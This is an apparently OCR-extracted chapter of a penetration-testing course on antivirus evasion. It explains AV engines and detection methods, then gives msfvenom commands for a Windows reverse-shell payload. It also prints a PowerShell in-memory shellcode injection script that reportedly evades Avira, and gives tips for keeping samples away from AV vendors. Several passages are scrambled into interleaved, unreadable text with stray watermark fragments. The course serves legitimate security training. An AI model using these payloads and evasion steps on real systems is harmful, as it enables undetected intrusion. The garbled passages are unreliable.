@@ -1,0 +1,1010 @@
+                                                                                                                                                      Penetration Testing with Kali Linux
+
+15 Antivirus Evasion
+
+In this Module, we will cover the following Learning Units:
+· Antivirus Software Key Components and Operations
+· Bypassing Antivirus Detections
+· Antivirus Evasion in Practice
+
+To compromise a target machine, attackers often disable or otherwise bypass antivirus software
+installed on these systems. As penetration testers, we must understand and be able to recreate
+these techniques to demonstrate this potential threat to our client.
+
+In this Module, we will discuss the purpose of antivirus software, discover how it works, and
+outline how it is deployed in most companies. We will examine various methods used to detect
+malicious software and explore some of the available tools and techniques that will allow us to
+bypass AV software on target machines.
+
+15.1 Antivirus software key components and operations
+
+This Learning Unit covers the following Learning Objectives:
+
+· Recognize Known vs Unknown Threats
+
+· Understand AV Key Components
+
+· Understand AV Detection Engines         designedWhtoitlporwevent,                                                                                   detect,  and  remove  malicious
+Antivirus (AV), is a type of application
+
+sdinoecfvltuewdloaeprsem.aedIntdtiwtoioafnsnaelowprirtgoyitnpeaeclstlyioonfdsmessaiuglwcnhaerdaes,tloIiDkeSs/ibJmIePofptSsfl,yrfaeirnyreedwmraaolnlv,sewoemcbowsmiatepreus,tcaeanrntivnvieirrurusss,eassno. dftHwmoaworreeevn.eorw, wtyitphicathlley
+
+I1gno5ait.ls1o.o1friaginsaigl ndaKetsunirgoenw,isanntovansutniuviqinruOukSes-nly5so7oi7dwf5tew2nn1at9itrf0hey rbaeaasspetsesciitfsicoppieercaetioonf  and decisions on signatures. The
+                                                                                                                                                      malware. Signatures can vary in
+
+terms of type and characteristics that can span from a very generic file hash summary to a more
+
+specific binary sequence match. As we'll discover in the following section, an AV comprises
+
+different engines responsible for detecting and analyzing specific components of the running
+
+system.
+
+A signature language is often defined for each AV engine and thus, a signature can represent
+different aspects of a piece of malware, depending on the AV engine. For example, two signatures
+can be developed to contrast the exact same type of malware: one to target the malware file on
+disk and another to detect its network communication. The semantics of the two signatures can
+vary drastically as they are intended for two different AV engines. In 2014, a signature language
+named YARA was open-sourced to allow researchers to query the VirusTotal platform or even
+integrate their own malware signatures into AV products. VirusTotal is a malware search engine
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                    437
+                                                                           Penetration Testing with Kali Linux
+
+that allows users to search known malware or submit new samples and scan them against
+several AV products.
+
+As signatures are written based on known threats, AV products could initially only detect and
+react based on malware that has already been vetted and documented. However, modern AV
+solutions, including Windows Defender, are shipped with a Machine Learning (ML) engine that is
+queried whenever an unknown file is discovered on a system. These ML engines can detect
+unknown threats. Since ML engines operate on the cloud, they require an active connection to the
+internet, which is often not an option on internal enterprise servers. Moreover, the many engines
+that constitute an AV should not borrow too many computing resources from the rest of the
+system as it could impact the system's usability.
+
+To overcome these AV limitations, Endpoint Detection and Response (EDR) solutions have evolved
+during recent years. EDR software is responsible for generating security-event telemetry and
+forwarding it to a Security Information and Event Management (SIEM) system, which collects data
+from every company host. These events are then rendered by the SIEM so that the security
+analyst team can gain a full overview of any past or ongoing attack affecting the organization.
+
+Even though some EDR solutions include AV components, AVs and EDRs are not mutually
+exclusive as they complement each other with enhanced visibility and detection. Ultimately, their
+deployment should be evaluated based on an organization's internal network design and current
+security posture.
+
+15.1.2 AV engines and components
+
+At its core, a modern AV   intishteufurinenltfeeedrendbesyt.thsTiehgonmsaoeturerseisgpuneWpahcdtiiufatirctleeoeswdnefgefiintnceihtsieo. dnsfraorme  the vendor's signature
+database that resides on                                                                                                                            stored in the local AV
+signature database, which
+
+A  modern antivirus  is  typically  designed  arouJenfdfrtheey  following  components:
+·     File Engine
+
+· Memory Engine                     OS-57752190
+· Network Engine
+· Disassembler
+
+· Emulator/Sandbox
+
+· Browser Plugin
+
+· Machine Learning Engine
+
+Each of the engines above work simultaneously with the signature database to rank specific
+events as either benign, malicious, or unknown.
+
+The file engine is responsible for both scheduled and real-time file scans. When the engine
+performs a scheduled scan, it simply parses the entire file system and sends each file's metadata
+or data to the signature engine. On the contrary, real-time scans involve detecting and possibly
+reacting to any new file action, such as downloading new malware from a website. To detect
+such operations, the real-time scanners need to identify events at the kernel level via a specially
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                            438
+                                                                                     Penetration Testing with Kali Linux
+
+crafted mini-filter driver. This is the reason why a modern AV needs to operate both in kernel and
+user land, in order to validate the entire operating system scope.
+
+The memory engine inspects each process's memory space at runtime for well-known binary
+signatures or suspicious API calls that might result in memory injection attacks, as we'll find
+shortly.
+
+As the name suggests, the network engine inspects the incoming and outgoing network traffic on
+the local network interface. Once a signature is matched, a network engine might attempt to
+block the malware from communicating with its Command and Control (C2) server.
+
+To further hinder detection, malware often employs encryption and decryption through custom
+routines to conceal its true nature. AVs counterattack this strategy by disassembling the malware
+packers or ciphers and loading the malware into a sandbox, or emulator.
+
+The disassembler engine is responsible for translating machine code into assembly language,
+reconstructing the original program code section, and identifying any encoding/decoding routine.
+A sandbox is a special isolated environment in the AV software where malware can be safely
+loaded and executed without causing potential havoc to the system. Once the malware is
+unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known
+signature.
+
+As browsers are protected by the sandbox, modern AVs often employ browser plugins to get
+better visibility and detect malicious content that might be executed inside the browser.
+
+Additionally, the machine learning component is becoming a vital part of current AVs as it enables
+                                                          cloud-enhWhaintcleodw
+detection  of  unknown threats by relying  on                                    computing  resources  and  algorithms.
+
+15.1.3           Detection methods
+Ahasvme ebneteionnbeudiltefaorlri,ebr,uatnthtieviyrusstilsl isgenravteurtehesysJnaetmfafxereapynudrpsocsoepoefmunaiyqudeiflfyeirdbeanstiefydinognathsepeecnigfiicnethtrheeayt
+
+or malware.              going  to OeSx-p5l7o7r5e2t1h9e0  following  AV   detection  methodologies     and  explain  how
+
+In this section, we are
+they work together.
+
+· Signature-based Detection
+
+· Heuristic-based Detection
+
+· Behavioral Detection
+
+· Machine Learning Detection
+
+Signature-based antivirus detection is mostly considered a restricted list technology. In other
+words, the filesystem is scanned for known malware signatures and if any are detected, the
+offending files are quarantined.
+
+A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as
+specific binary values and strings that should belong only to that specific malware.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                             439
+                                                                                                    Penetration Testing with Kali Linux
+
+Relying on just the file hash as the only detection mechanism is a weak strategy because
+changing a single bit from the file would result in a completely different hash.
+
+As an example, we created a text file on our local Kali machine that contains the string "offsec".
+Let's dump its binary representation via the xxd tool by passing the -b argument before the file
+name.
+
+kali@kali:~$ <cu>xxd -b malware.txt</cu>
+
+00000000: 01101111 01100110 01100110 01110011 01100101 <cr>01100011</cr>                                                                                                                                                                                offsec
+
+00000006: 00001010                                                                                                                                                                                                                            .
+
+                              Listing 331 - Inspecting the binary file content with xxd
+
+We displayed the content of the file through the xxd utility. The output shows the binary offset on
+the leftmost column, the actual binary representation in the middle column, and the ASCII
+translation on the rightmost one. We have also highlighted the binary representation of the letter
+"c" in red. Its purpose will become clear shortly.
+
+Now, assuming this is real malware, we want to calculate the hash of the file, and we can do so
+through the sha256sum utility.
+
+kali@kali:~$ <cu>sha256sum malware.txt</cu>
+c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e malware.txt
+
+                                             Listing 332 - Calculating the SHA256 hash of the file
+
+Let's now replace the last letter of the "offsec" string with a capital C and dump its binary value via
+xxd once more.
+
+kali@kali:~$ <cu>xxd -b malware.txt</cu>                            f0Wil1hei1ct0ol0no1tew0n1t
+
+00000000:   01101111  01100110 01100110 01110011                                                 <cr>01000011</cr>                                                                                                                                      offseC
+00000006:   00001010               Listing 333 - Inspecting the                                 with xxd
+
+In listing  333,  we  notice  that  the  binary  valuJeefoffrtehye  last  letter                is  changed                                                                                                                                   only  in  its  third  bit  from
+the left.
+
+1Shk5aainldsci0cef@hkaeaa0vn7lefigr0:ye~ddhb$,a5les<6tcfh'su2in7>cgsbachalcaclg82ua5ola67rti8stehu4tmcmh1emfOisa7SS6l-Hsaw5uA8a7p7br2p5fe52o.1610ts97xhe0t4ad<bst/3hoacouep>6nr9ot7dhcuefcm1e2oaadctfiof7ite3ad7ll4ys2tdraii0nffcgec.r3e7nct  hash even if only     one  bit
+
+                                                                                                                                                                                                                                                malware.txt
+
+                              Listing 334 - Calculating the SHA256 hash on the modified file
+
+Unsurprisingly, the hash value has fully changed, which proves the fragility of relying solely on
+hash file signature detections.
+
+To address the pitfalls of signature-based detection, antivirus manufacturers introduced
+additional detection methods to improve the effectiveness of their products.
+
+Heuristic-Based Detection is a detection method that relies on various rules and algorithms to
+determine if an action is considered malicious. This is often achieved by stepping through the
+instruction set of a binary file or by attempting to disassemble the machine code and ultimately
+decompile and analyze the source code to obtain a more comprehensive map of the program.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                 440
+                                                                          Penetration Testing with Kali Linux
+
+The idea is to search for various patterns and program calls (as opposed to simple byte
+sequences) that are considered malicious.
+
+Alternatively, Behavior-Based Detection dynamically analyzes the behavior of a binary file. This is
+often achieved by executing the file in question in an emulated environment, such as a small
+virtual machine, or sandbox,and searching for behaviors or actions that are considered malicious.
+
+Lastly, Machine-Learning Detection aims to up the game by introducing ML algorithms to detect
+unknown threats by collecting and analyzing additional metadata. For instance, Microsoft
+Windows Defender has two ML components: the client ML engine, which is responsible for
+creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the
+submitted sample against a metadata-based model comprised of all the submitted samples.
+Whenever the client ML engine is unable to determine whether a program is benign or not, it will
+query the cloud ML counterpart for a final response.
+
+Since these techniques do not require malware signatures, they can be used to identify unknown
+malware, or variations of known malware, more effectively. Given that antivirus manufacturers
+use different implementations when it comes to heuristics, behavior, and machine learning
+detection, each antivirus product will differ in terms of what code is considered malicious.
+
+It's worth noting that many antivirus developers use a combination of these detection methods to
+achieve higher detection rates.
+
+To demonstrate the effectiveness of various antivirus products, we will start by scanning a
+
+popular Metasploit payload. Using msfvenom, we will generate a standard Portable Executable
+
+(PE)  file containing our  ipsauysloeaddo. nInWthinisdcoawsseowpeerwatililnuWgshseiytasltosewimmsplfeoTr CexPerceuvtearbslee  shell.
+      The PE file format                                                                                                      and object
+
+      rnfieeleqcsue.isrTeshdaerdyPyfEnoarfomthrmiec aWlitbirrnaedproirewesss, eALnPotIsaidmaeWpr otionrtdmaoJnawednfsafedrgxeeapytotahrtesttwarubrcaletpuspr,eeedttche.axtedceuttaaiblslethceodinefoinrmcluadtiionng
+
+Blwaeeteflols.rtAevVgeervsneieonrndaotoirnfsgKmaalnui.ysMtMreeetabtasuspilpdlolOoitStih-tgo5pe7sat7esy5l2sou1iapg9ddn0saa,tteuitdreisfsraeaqbnuedesnpttuplysrahacntthdiceeimtstoAamsV auskpigednasatuteurser.ewsTheciosaurceldornucsnhtnaainnngtgeatnhades
+intrinsic delay in pushing new up-to-date signatures could give attackers an extra edge during a
+
+penetration test, since a fresh Metasploit version might run undetected due to stale AV
+
+signatures.
+
+Let's generate the test binary payload by running the msfvenom command followed by the -p
+argument specifying the payload. We'll then pass the reverse shell local host (LHOST) and local
+port (LPORT) arguments along with the EXE file format and redirect the output to a file named
+binary.exe.
+
+kali@kali:~$ <cu>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f
+exe > binary.exe</cu>
+...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                              441
+                                                                                                                              Penetration Testing with Kali Linux
+
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+
+                                 Listing 335 - Generating a malicious PE containing a meterpreter shell.
+
+Next, we will run a virus scan on this executable. Rather than installing many antivirus
+applications on our local machine, we can upload our file to VirusTotal, which will scan it to
+determine the detection rate of various AV products.
+
+     VirusTotal is convenient, but it generates a hash along with storing the original file for
+     each unique submission. The submitted files along with the metadata are then shared
+     with all participating AV vendors. As such, take care when submitting sensitive payloads
+     as the hash is considered public from the time of first submission.
+
+The results of this scan are listed below.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                          Figure 222: Virustotal results on the msfvenom payload.
+
+We'll notice in our results that many antivirus products determined our file is malicious based on
+the different detection mechanisms we have illustrated in this section.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  442
+                                                                          Penetration Testing with Kali Linux
+
+In this Learning Unit, we have explored the different components that constitute a modern AV and
+covered the various strategies adopted to detect malicious software.
+
+In the next Learning Unit, we are going to make use of this knowledge and learn the different
+mechanisms that enable attackers to evade antivirus detections.
+
+15.2 Bypassing antivirus detections
+
+This Learning Unit covers the following Learning Objectives:
+
+· Understand On-disk Evasion Techniques
+
+· Understand In-memory Evasion Techniques
+
+Antivirus evasion falls into two broad categories: on-disk and in-memory. On-disk evasion focuses
+on modifying malicious files physically stored on disk to evade AV file engine detections.
+However, given the maturity of modern AV file scanning engines, modern malware often attempts
+in-memory operation, which avoids the disk entirely and therefore, reduces the possibility of being
+detected. In the following sections, we will give a very general overview of some of the techniques
+used in both approaches. Please note that details about these techniques are outside the scope
+of this Module.
+
+15.2.1 On-disk evasion
+
+To begin our discussion of evasion, we will first inspect various techniques used to obfuscate
+files stored on a physical disk.
+tOspnMddehixoreubmeooettrfediducpunoceuusslgnitrcctseilnaoyaettiobhntdcosolfeemnirAnUh.s-edvaaVPUaroilsXeslnresllokvlyrcaaierkmanbgddennduaaatemntnyholwewiiseztsorhaesdouaher.efaslerasErensptnoovhdhooebf"epfzmunfsuiunpipniutslgacO"ahttcSntcearocia-kaortopu5nteetnimag7uoerac7schrtnpleo5,.kly2rsGdepce1aoereaais9svnmqncs0iednuakinetoeilJaavoanretmkanshswfelteefeoewaarmndichyseetehiayrgrtnwrneehnnhoisWiayqttohucmhtufisrlomoteitauag,ssrllfaitmccw,onfkoioawpacasefmnali.rsledyecOnpeikitsdtlnufeekfmetesrteosseescooilspetgygrfivaevneantacehendedelvdeeyiwefarafeatribmnbociataydieurnotprlliiesatadoaeldrntenssoyourtswenoscrwxefteoAneravluteVcdteyhchtuesriwstsestrucaoeortasabf-reeeinknlz.acenndeTvshgetophnhoimrineeisadqfee.otifunadeirilengreess,.
+This includes replacing instructions with semantically equivalent ones, inserting irrelevant
+instructions or dead code, splitting or reordering functions, and so on. Although primarily used by
+software developers to protect their intellectual property, this technique is also marginally
+effective against signature-based AV detection. Modern obfuscators also have runtime in-
+memory capabilities, which aims to hinder AV detection even further.
+
+Crypter software cryptographically alters executable code, adding a decryption stub that restores
+the original code upon execution. This decryption happens in-memory, leaving only the encrypted
+code on-disk. Encryption has become foundational in modern malware as one of the most
+effective AV evasion techniques.
+
+Highly effective antivirus evasion requires a combination of all the previous techniques in addition
+to other advanced ones, including anti-reversing, anti-debugging, virtual machine emulation
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  443
+                                                                          Penetration Testing with Kali Linux
+
+detection, and so on. In most cases, software protectors were designed for legitimate purposes,
+like anti-copy, but can also be used to bypass AV detection.
+
+Most of these techniques may appear simple at a high-level but they can be quite complex.
+Because of this, there are currently few actively maintained free tools that provide acceptable
+antivirus evasion. Among commercially available tools, The Enigma Protector can be used to
+successfully bypass antivirus products.
+
+15.2.2 In-memory evasion
+
+In-Memory Injections, also known as PE Injection, is a popular technique used to bypass antivirus
+products on Windows machines. Rather than obfuscating a malicious binary, creating new
+sections, or changing existing permissions, this technique instead focuses on the manipulation of
+volatile memory. One of the main benefits of this technique is that it does not write any files to
+disk, which is a commonly focused area for most antivirus products.
+
+There are several evasion techniques that do not write files to disk. While we will still provide a
+brief explanation for some of them, we will only cover in-memory injection using PowerShell in
+detail as the others rely on a low-level programming background in languages such as C/C++ and
+are outside of the scope of this Module.
+
+The first technique we are going to cover is Remote Process Memory Injection, which attempts to
+inject the payload into another valid PE that is not malicious. The most common method of doing
+this is by leveraging a set of Windows APIs. First, we would use the OpenProcess function to
+obtain a valid HANDLE to a target process that we have permission to access. After obtaining the
+HThmCasahrAaesiVNslaicibtDrseiteooLuReuuEaensn,lmAwdsplolseuoatcecycwclEToooexhmaus.rdeslpOdafltneudaocxlllAle,ytohbPctceuhIao.tetnpewemiemwedelwe,mymiitaollolrilusyorsychueaiasntasuetadhsblieelmmyecJnieeoelaxmfnareftlolrtecoeeruxcycyttaheoutWndefshidiqtiinhntugialnemtoWtiwpnherremioatecrolePearmsrytoesocirnbteeeysaxspacMrsamoelelcppimnelaegsor,saara,ytlewW.loAetwihnfwtirdeneoorgawutdPlhsdoeuAcwspoPienapIrgyySslouhtthhcaeheedll
+LitUnoonsaldtidakoLenictbherreea. grhyuelaAarPvyID, lLtifhLteinignRjeeafcnletdicotnaiv, evOweSDr-hy5Lic7Lsh7i5mIn2inji1ela9vc0ortilboveunst tseliocmhapndliiiqnfiugeedaaattmtteaamclkipctitosaurgtsoetDlionLagLdafarlooDmcaLlLdpissotkworeeurdssihnbegyll.etthhxeee
+attacker in the process memory.
+
+The main challenge of implementing this technique is that LoadLibrary does not support loading a
+DLL from memory. Furthermore, the Windows operating system does not expose any APIs that
+can handle this either. Attackers who choose to use this technique must write their own version
+of the API that does not rely on a disk-based DLL.
+
+The third technique we want to mention is Process Hollowing. When using process hollowing to
+bypass antivirus software, attackers first launch a non-malicious process in a suspended state.
+Once launched, the image of the process is removed from memory and replaced with a malicious
+executable image. Finally, the process is then resumed, and malicious code is executed instead
+of the legitimate process.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  444
+                                                                          Penetration Testing with Kali Linux
+
+Ultimately, Inline hooking, as the name suggests, involves modifying memory and introducing a
+hook (an instruction that redirects the code execution) into a function to make it point to our
+malicious code. Upon executing our malicious code, the flow will return to the modified function
+and resume execution, appearing as if only the original code had executed.
+
+Hooking is a technique often employed by rootkits, a stealthier kind of malware. Rootkits aim to
+provide the malware author dedicated and persistent access to the target system through
+modification of system components in user space, kernel, or even at lower OS protection rings
+such as boot or hypervisor. Since rootkits need administrative privileges to implant its hooks, it is
+often installed from an elevated shell or by exploiting a privilege-escalation vulnerability.
+
+15.3 AV evasion in practice
+
+This Learning Unit covers the following Learning Objectives:
+· Understand Antivirus Evasion Testing Best Practices
+· Manually Evade AV Solutions
+· Leverage Automated Tools for AV Evasion
+
+Depending on the kind of AV we are facing during an engagement, we might want to resort to
+
+automated or manual AV evasion avenues. Either way, we first need to understand the pros and
+
+cons associated with these strategies. In this Learning Unit, we are going to first understand best
+
+practices related to AV evasion and how to perform a real AV bypass along with basic manual in-
+
+memory evasion through PowerShell. Finally, we are going to rely on third-party tools to automate
+
+on-disk and in-memory evasion techniques.  Whitlow
+
+15.3.1 Testing for AV evasion
+
+dOTehpteeerctaettirioomnnsSaegCcaeOinnptsestrdb(eoSftOihnCew)s.etlTlh-hkeencogowollanablaoonrfdattnhiooenvSebJeleetcfthOwfrrepeeaseytnste.tahme einstetorpprirsoevIiTdedecpoanrttinmueonutsapnrdottheectSioencuarnitdy
+
+eeASxnestgcrpaOaegpnesiemmttrepeaalntimictosans.tiwotenhssetenrrsde,egwaalerindwginagwnOittShat-on5At7diVv7ei5prv2ure1osl9od0puecvatasrs.eiFaoolnisrttidhceisuvneredloaepsrmsotnea,nnwtdeintsghhaootfutlcdhoesutcladornt schioednlepsraidtueiosrninsognfaacfoienuwgr
+
+As an initial example, VirusTotal can give us a good glimpse of how stealthy our malware could
+be, once scanned, the platform sends our sample to every antivirus vendor that has an active
+membership.
+
+This means that shortly after we have submitted our sample, most of the AV vendors will be able
+run it inside their custom sandbox and machine learning engines to build specific detection
+signatures, thus rendering our offensive tooling unusable.
+
+As an alternative to VirusTotal, we should resort to Kleenscan.com. This service scans our sample
+against 30 different AV engines and claims to not divulge any submitted sample to third parties.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  445
+                                                                                                                              Penetration Testing with Kali Linux
+
+The service offers up to four scans a day and additional ones at a small fee after the daily limit
+has been reached.
+
+However, relying on tools such as Kleenscan.com is considered a last resort when we don't know
+the specifics of our target's AV vendor. If we do know those specifics on the other hand, we
+should build a dedicated VM that resembles the customer environment as closely as possible.
+
+Regardless of the tested AV product, we should always make sure to disable sample submission
+so that we don't incur the same drawback as VirusTotal. For instance, Windows Defender's
+Automatic Sample Submission can be disabled by navigating to Windows Security > Virus & threat
+protection > Manage Settings and deselecting the relative option as illustrated in the image below.
+
+                         Whitlow
+               Jeffrey
+OS-57752190
+
+                                Figure 223: Disabling Windows Defender Automated Sample Submission
+
+Having such a simulated target scenario allows us to freely test AV evasion vectors without
+worrying about our sample being submitted for further analysis.
+
+Since automatic sample submission allows Windows Defender to get our sample analyzed by its
+machine learning cloud engines, we should only enable it once we are confident our bypasses will
+be effective and only if our target has sample submission enabled.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  446
+                                                                                                                              Penetration Testing with Kali Linux
+
+     Since both Windows Defender cloud protection and automatic sample submission
+     require internet connectivity, we should first verify that this is reflected in our target
+     environment: some company policies mandate limited internet access to some
+     production servers and as a consequence, some advanced AV features are inhibited.
+
+Another rule of thumb we should follow when developing AV bypasses is to always prefer custom
+code. As we have learned at the beginning of this Module, AV signatures are extrapolated from
+the malware sample and thus, the more novel and diversified our code is, the fewer chances we
+must incur any existing detection.
+
+15.3.2 Evading AV with thread injection
+
+Now that we have a general understanding of the detection techniques used in antivirus software
+and the relative bypass methods, we can turn our focus to a practical example.
+
+Finding a universal solution to bypass all antivirus products is difficult and time consuming, if not
+impossible. Considering time limitations during a typical penetration test, it is far more efficient to
+target the specific antivirus product deployed in the target network.
+
+For the purposes of this Module, we will interact with Avira Free Security version 1.1.68.29553 on
+our Windows 11 client. Once we connect via RDP with the provided credentials, we'll notice that
+Avira is already installed and can be launched from the Desktop shortcut. Once started, we can
+navigate to the Security panel from the left menu and click on Protection Options:
+
+                                                              Whitlow
+                                                    Jeffrey
+                                     OS-57752190
+
+                                     Figure 224: Searching for Protections Options in the Avira Menu
+
+As a first step when testing AV products, we should verify that the antivirus is working as
+intended. We will use the Metasploit payload we generated earlier and scan it with Avira.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  447
+                                                                                                                              Penetration Testing with Kali Linux
+
+After transferring the malicious portable executable (PE) to our Windows client, we are almost
+immediately warned about the malicious content of the uploaded file. In this case, we are
+presented with an error message indicating that our file has been blocked.
+
+Figure 225: Avira Free Antivirus Quarantine Message
+
+                             Whitlow
+                  Jeffrey
+   OS-57752190
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  448
+                                                                                     Penetration Testing with Kali Linux
+
+                   Figure 226: Avira Free Antivirus Quarantine Message - Threat blocked
+
+Avira displays  a  popup  notification  informing  us  Wthhiatt ltohwe    file  was  flagged  as  malicious                         and
+quarantined.
+
+Antivirus products typically enforce    tshtroeJraientfgfqrutheayeramntainliceiobuysbsloacmkipnlgesainnyefnilecrsyypstetedmstorage
+operation at the kernel level or even
+DpreopdeaunccdctisensgwsiiotbhnlethhoeonwhlyebrlpeysotthfriePctoAewVdesOoroSSu-fhrt5ew7tlla7a.5rrg2ee1. 9t0environment is, we might be able to bypass antivirus
+
+In the following example, we will use a remote process memory injection technique, like what we
+learned in the previous Learning Unit. The main difference lies in the fact that we will target the
+currently executing process, which in our case will be the x86 PowerShell interpreter.
+
+A very powerful feature of PowerShell is its ability to interact with the Windows API. This allows us
+to implement the in-memory injection process in a PowerShell script. One of the main benefits of
+executing a script rather than a PE is that it is difficult for antivirus manufacturers to determine if
+the script is malicious as it's run inside an interpreter and the script itself isn't executable code.
+Nevertheless, please keep in mind that some AV products handle malicious script detection with
+more success than others.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                            449
+                                                                                     Penetration Testing with Kali Linux
+
+Furthermore, even if the script is marked as malicious, it can easily be altered. Antivirus software
+will often review variable names, comments, and logic, all of which can be changed without the
+need to recompile anything.
+
+To demonstrate an introductory AV bypass, we are going to first analyze a well-known version of
+the memory injection PowerShell script and then test it against Avira.
+
+A basic templated script that performs in-memory injection is shown in the listing below.
+
+$code = <cg>'</cg>
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);<cg>'</cg>;
+
+<cr><place shellcode here></cr>
+                                      Listing 336 - In-memory payload injection script for PowerShell
+
+The script starts by importing VirtualAlloc and CreateThread from kernel32.dll as well as memset
+
+from msvcrt.dll. These functions will allow us to allocate memory, create an execution thread, and
+
+write arbitrary data to the allocated memory, respectively. We will allocate the memory and
+
+execute a new thread in the current process (powershell.exe), rather than a remote one.
+                                                     can Wgheintleorawte
+Our payload is missing  from  our  script,  but  we                       it  using  msfvenom          with  the  format
+PowerShell reflection.
+
+PenocwoetDidnhruecseCedrhedaetsaeoullhsmturiieoneoplnlgfncdlleosyactdtdrteeaiiodftfaniidocnensudtclvetrt.icirdpTateitonoobsnr.efesegOfirlSigesn-ncs5itat7btt7iuhny5irt2seao1sls9lot,h0haciafvaJtto,etitifmndhfgieernemugpynaoamynrlyota.iavnAidarfugtbseeerddlwoemwatereddcmsitfi,fooeintrrysbh, ufatrhisoledmbnsedatcheodecmyoonednaeemsuitscheeadsbisnaesme6b4ly-
+that includes a method designed to run the injected payload.
+
+kali@kali:~$ <cu>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f
+psh-reflection</cu>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of psh-reflection file: 2960 bytes
+...
+function xf {
+
+              Param ($nfCl, $vf)
+              $uaQP = ([AppDomain]...
+...
+
+                              Listing 337 - Generating a PowerShell compatible payload using msfvenom
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                          450
+                                                                                Penetration Testing with Kali Linux
+
+Now that we have generated shellcode, we can replace <place shellcode here> with the
+PowerShell output.
+
+Our complete script resembles the following:
+
+$code = '
+[DllImport("kernel32.dll")]
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("msvcrt.dll")]
+public static extern IntPtr memset(IntPtr dest, uint src, uint count);';
+
+function <cr>xf</cr> {
+              Param (<cr>$nfCl</cr>, <cr>$vf</cr>)
+              $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {
+
+$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')
+}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+return <cr>$uaQP</cr>.GetMethod('GetProcAddress',
+
+[Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null,
+
+@([System.Runtime.InteropServices.HandleRef](New-Object
+
+System.Runtime.InteropServices.HandleRef((New-Object IntPtr),
+
+(<cr>$uaQP</cr>.GetMethod('GetModuleHandle')).Invoke($null, @(<cr>$nfCl</cr>)))),
+
+<cr>$vf</cr>))
+
+}                                              Whitlow
+
+function xb {                                  01J),e]fMf[arTnedyyapte]or$yhh=
+              Param (
+
+                       [Parameter(Position  =                                   $True)] [Type[]]  $jGN_b,
+                       [Parameter(Position  =                                   = [Void]
+
+)
+
+...           often rely  noanmLseitssati,tniOgctSo3-s35tc87rai-7ntF5cgi2rhs1st9aim0gttneaamlitcputiorfeousrsinr-esmclaertmipeodtrsy.tionTjemoctieobanynspcianrisgpstfutl hcisoddeepteocrttiioonnsl,osguicc,hoausr
+              function
+AV vendors
+variables or
+
+generated payload with the format psh-reflection already has randomly generated variable and
+
+function names as highlighted above. These names will be different every time we generate a
+
+payload with psh-reflection.
+
+As mentioned, scripts are just interpreted text files. They are not easily fingerprinted like binary
+files, which have a more structured data format.
+
+Next, we are going to verify the detection rate of our PowerShell script using VirusTotal.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                   451
+                                                                                         Penetration Testing with Kali Linux
+
+                        Figure 227: VirusTotal results for in-memory injection in PowerShell
+
+According to the results of the VirusTotal scan, 25 of the 63 AV products flagged our script as
+
+malicious. Avira did not flag our payload.
+                        aPoQwueicrkShSeclal nsctroipvtearsifybtyhpaatsos.uprsa1Wthtaiantcdlkotwvreacntsofrerisituonvdeertethcteedta. rTgoetruWnintdhoewssca1n1,
+Once     we  save  the                        left-hJeafnfdremyenu,
+client,  we  can   run
+
+we'll click  on the Security option  on  the                              select  Virus  Scans,  and  then  click  on                                                                                                                                     Scan
+under the    Quick Scan option.
+
+VtmTeoisrautgcsaheTstinosoeteaulnlersaasesranomwinfepgtlhlle.eeHncdgooeiuwntleedecsvbt.eiOeorS,na-a5nrs7aa7wtley5ez2, 1wele9de0aarcnnoedudlddeehatearlcvieteer,dutphblioysatchdoeeudmldtohjereeomppaoorwddieifzireefduolbucyrloppuaesdns-ebttaorasteiodn
+
+Once Avira has scanned our script on our Windows 11 machine, it indicates our script is not
+malicious.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                  452
